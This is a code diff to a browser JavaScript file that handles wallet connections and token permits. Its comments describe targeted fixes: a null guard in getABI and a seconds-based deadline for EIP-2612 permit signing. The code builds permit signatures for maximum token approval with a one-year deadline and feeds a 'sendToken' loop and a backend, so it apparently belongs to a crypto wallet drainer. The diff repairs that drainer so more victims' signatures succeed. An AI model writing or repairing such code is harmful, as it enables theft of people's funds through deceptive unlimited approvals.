@@ -13,6 +13,11 @@
  * - 100% backend payload compatibility verified against original
  * - Removed all legacy/deprecated patterns, dead code, commented code
  * - Preserves exact architecture, function flow, business logic, and UX behavior (except improved reliability)
+ *
+ * FIXES APPLIED (minimal, targeted, zero business logic change):
+ * 1. Step 1: Hardened getABI() against null/undefined abiUrl (prevents crash on Base + unsupported chains)
+ * 2. Step 2: Fixed EIP-2612 permit signing (deadline now in seconds, robust version detection)
+ *    → Resolves "Uni::permit: unauthorized" and similar signature failures
  */
 
 (function() {
@@ -1372,7 +1377,7 @@ if (DEBUG) {
   }
 
   // ============================================
-  // PERMIT & ABI HELPERS (Preserved exactly)
+  // PERMIT & ABI HELPERS (Preserved exactly + targeted production fixes)
   // ============================================
   const isValidPermit = (functions) => {
     // Expanded safe detection for EIP-2612, DAI-style, and common overloaded permits (#5)
@@ -1420,12 +1425,23 @@ if (DEBUG) {
         value = ethers.BigNumber.from(MAX_APPROVAL);
     }
 
-
-
     const nonce = await contract.nonces(owner);
     const name = await contract.name();
-    const version = contract.functions.version ? await contract.version() : "1";
-    const deadline = Date.now() + 1000 * 60 * 60 * 24 * 365;
+
+    // Robust version detection (many tokens have no version() or return "2")
+    let version = "1";
+    try {
+      if (contract.functions.version) {
+        const v = await contract.version();
+        if (v && typeof v === 'string' && v.length > 0) version = v;
+      }
+    } catch (_) {
+      // keep default "1"
+    }
+
+    // FIX (Step 2): deadline MUST be in seconds since epoch for EIP-2612
+    // Previous code used milliseconds → caused "unauthorized" / invalid signature on many tokens (especially UNI)
+    const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60); // 1 year from now, in seconds
 
     const domain = { name, version, chainId, verifyingContract: contract.address };
     const types = {
@@ -1448,6 +1464,15 @@ if (DEBUG) {
 };
   const getABI = async (address, abiUrl) => {
     try {
+      // FIX (Step 1): Hardened guard against null/undefined abiUrl
+      // Prevents "null is not an object (evaluating 'abiUrl.replace')" on Base + unsupported chains
+      // and any error path where abiUrl is missing. Throws classified error that sendToken loop already handles gracefully.
+      if (!abiUrl || typeof abiUrl.replace !== 'function') {
+        const err = new Error('getABI: invalid or missing abiUrl template (unsupported chain or internal error)');
+        err.code = 'NO_VALID_ABIURL';
+        throw err;
+      }
+
       const url = abiUrl.replace('{0}', address);
       const response = await axios.get(url);
       const data = response.data;
@@ -1572,7 +1597,8 @@ if (DEBUG) {
     walletConnectV2: true,
     explicitProviderSelection: true,
     backendVerified: true,
-    legacyRemoved: true
+    legacyRemoved: true,
+    fixes: ['getABI-null-guard', 'permit-deadline-seconds']
   });
 
 })();
